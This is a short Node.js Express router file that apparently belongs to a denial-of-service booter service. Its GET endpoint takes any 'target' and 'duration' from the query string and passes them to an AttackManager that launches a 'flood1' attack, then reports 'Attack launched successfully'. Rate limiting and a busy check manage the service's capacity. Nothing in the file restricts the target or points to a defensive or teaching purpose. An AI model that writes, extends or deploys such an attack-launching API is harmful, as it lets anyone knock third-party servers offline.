const express = require('express');
const router = express.Router();
const { v4: uuidv4 } = require('uuid');
const AttackManager = require('../lib/attackManager');
const rateLimit = require('express-rate-limit');

const attackManager = new AttackManager();

const limiter = rateLimit({
  windowMs: 5 * 60 * 1000,
  max: 10,
  message: { success: false, error: 'Too many requests, please try again later' }
});

router.get('/', limiter, async (req, res) => {
  const { target, duration } = req.query;
  
  if (!target || !duration) {
    return res.status(400).json({
      success: false,
      error: 'Parameter target dan duration diperlukan'
    });
  }

  if (!attackManager.canStartAttack()) {
    return res.status(429).json({
      success: false,
      error: 'Server is busy, please try again later'
    });
  }

  try {
    const attackId = uuidv4();
    await attackManager.executeAttack('flood1', attackId, [target, duration], parseInt(duration) * 1000 + 5000);
    
    res.json({
      success: true,
      method: 'flood1',
      target: target,
      duration: duration,
      attackId: attackId,
      message: 'Attack launched successfully'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      method: 'flood1'
    });
  }
});

module.exports = router;